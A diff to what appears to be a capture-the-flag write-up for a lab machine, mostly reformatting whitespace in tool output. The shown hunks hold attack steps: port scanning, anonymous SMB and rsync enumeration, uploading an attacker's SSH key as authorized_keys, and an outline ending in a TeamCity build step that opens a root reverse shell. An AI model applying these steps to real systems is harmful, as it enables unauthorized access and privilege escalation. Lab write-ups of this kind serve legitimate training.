@@ -14,18 +14,18 @@
 ```bash
 nmap -sS -sC -sV -O -A -p 22,111,139,445,873,2049,6379,38951,39209,41053,44523,45285 <TARGET_IP> -oN nmap.txt
 
-PORT      STATE SERVICE     VERSION
-22/tcp    open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
-111/tcp   open  rpcbind     2-4 (RPC #100000)
-139/tcp   open  netbios-ssn Samba smbd 4
-445/tcp   open  netbios-ssn Samba smbd 4
-873/tcp   open  rsync       (protocol version 31)
-2049/tcp  open  nfs         3-4 (RPC #100003)
-6379/tcp  open  redis       Redis key-value store
-39209/tcp open  mountd      1-3 (RPC #100005)
-41053/tcp open  nlockmgr    1-4 (RPC #100021)
-44523/tcp open  mountd      1-3 (RPC #100005)
-45285/tcp open  mountd      1-3 (RPC #100005)
+PORT STATE SERVICE VERSION
+22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+111/tcp open rpcbind 2-4 (RPC #100000)
+139/tcp open netbios-ssn Samba smbd 4
+445/tcp open netbios-ssn Samba smbd 4
+873/tcp open rsync (protocol version 31)
+2049/tcp open nfs 3-4 (RPC #100003)
+6379/tcp open redis Redis key-value store
+39209/tcp open mountd 1-3 (RPC #100005)
+41053/tcp open nlockmgr 1-4 (RPC #100021)
+44523/tcp open mountd 1-3 (RPC #100005)
+45285/tcp open mountd 1-3 (RPC #100005)
 ```
 
 ---
@@ -37,10 +37,10 @@ SMB (ports 139/445) — file and printer sharing protocol. Used here to enumerat
 ```bash
 smbclient -L //<TARGET_IP> -N -p 445
 
-Sharename       Type      Comment
-print$          Disk      Printer Drivers
-shares          Disk      VulnNet Business Shares
-IPC$            IPC       IPC Service
+Sharename Type Comment
+print$ Disk Printer Drivers
+shares Disk VulnNet Business Shares
+IPC$ IPC IPC Service
 ```
 
 | Switch | Description |
@@ -53,8 +53,8 @@ IPC$            IPC       IPC Service
 smbclient //<TARGET_IP>/shares -N
 
 smb: \> ls
-  temp    D    0  Sat Feb  6 12:45:10 2021
-  data    D    0  Tue Feb  2 10:27:33 2021
+ temp D 0 Sat Feb 6 12:45:10 2021
+ data D 0 Tue Feb 2 10:27:33 2021
 
 smb: \> cd temp
 smb: \temp\> more services.txt
@@ -159,16 +159,16 @@ rsync (port 873) — file synchronization tool between systems. Used here with c
 ```bash
 rsync --list-only rsync://<TARGET_IP>/
 
-files    Necessary home interaction
+files Necessary home interaction
 ```
 
 ```bash
 rsync --list-only rsync://rsync-connect@<TARGET_IP>/files
 
-drwxr-xr-x  4,096 .
-drwxr-xr-x  4,096 ssm-user
-drwxr-xr-x  4,096 sys-internal
-drwxr-xr-x  4,096 ubuntu
+drwxr-xr-x 4,096 .
+drwxr-xr-x 4,096 ssm-user
+drwxr-xr-x 4,096 sys-internal
+drwxr-xr-x 4,096 ubuntu
 ```
 
 ```bash
@@ -201,14 +201,14 @@ ssh-keygen -t rsa -f /tmp/id_rsa_vulnet -N ""
 cp /tmp/id_rsa_vulnet.pub /tmp/rsync/sys-internal/.ssh/authorized_keys
 
 RSYNC_PASSWORD='[rsync_password_redacted]' rsync -av /tmp/rsync/sys-internal/.ssh/ \
-  rsync://rsync-connect@<TARGET_IP>/files/sys-internal/.ssh/
+ rsync://rsync-connect@<TARGET_IP>/files/sys-internal/.ssh/
 
 sending incremental file list
 ./
 authorized_keys
 
-sent 695 bytes  received 38 bytes  488.67 bytes/sec
-total size is 563  speedup is 0.77
+sent 695 bytes received 38 bytes 488.67 bytes/sec
+total size is 563 speedup is 0.77
 ```
 
 ```bash
@@ -285,18 +285,18 @@ TeamCity executes builds as root. The build step launches a reverse shell with m
 
 ```mermaid
 graph TD
-    A["Recon\nnmap - 11 open ports"] --> B["SMB Enumeration\nsmbclient - anonymous share access"]
-    B --> C["Flag via SMB\ntemp/services.txt"]
-    A --> D["NFS Enumeration\nshowmount - /opt/conf exported unrestricted"]
-    D --> E["Redis Credential\nnfs mount - redis.conf - requirepass"]
-    E --> F["Redis Access\nredis-cli - internal flag + authlist"]
-    F --> G["rsync Credentials\nbase64 decode - rsync-connect"]
-    G --> H["Home Download via rsync\nfiles/sys-internal - user flag + empty .ssh"]
-    H --> I["SSH Key Write via rsync\nauthorized keys uploaded to server"]
-    I --> J["SSH Access as sys-internal\nssh with private key"]
-    J --> K["TeamCity on localhost 8111\nsuperuser token in catalina.out"]
-    K --> L["SSH Tunnel\nssh -L 8111:localhost:8111"]
-    L --> M["Build step - reverse shell\nTeamCity executes as root"]
+ A["Recon\nnmap - 11 open ports"] --> B["SMB Enumeration\nsmbclient - anonymous share access"]
+ B --> C["Flag via SMB\ntemp/services.txt"]
+ A --> D["NFS Enumeration\nshowmount - /opt/conf exported unrestricted"]
+ D --> E["Redis Credential\nnfs mount - redis.conf - requirepass"]
+ E --> F["Redis Access\nredis-cli - internal flag + authlist"]
+ F --> G["rsync Credentials\nbase64 decode - rsync-connect"]
+ G --> H["Home Download via rsync\nfiles/sys-internal - user flag + empty .ssh"]
+ H --> I["SSH Key Write via rsync\nauthorized keys uploaded to server"]
+ I --> J["SSH Access as sys-internal\nssh with private key"]
+ J --> K["TeamCity on localhost 8111\nsuperuser token in catalina.out"]
+ K --> L["SSH Tunnel\nssh -L 8111:localhost:8111"]
+ L --> M["Build step - reverse shell\nTeamCity executes as root"]
 ```
 
 ---
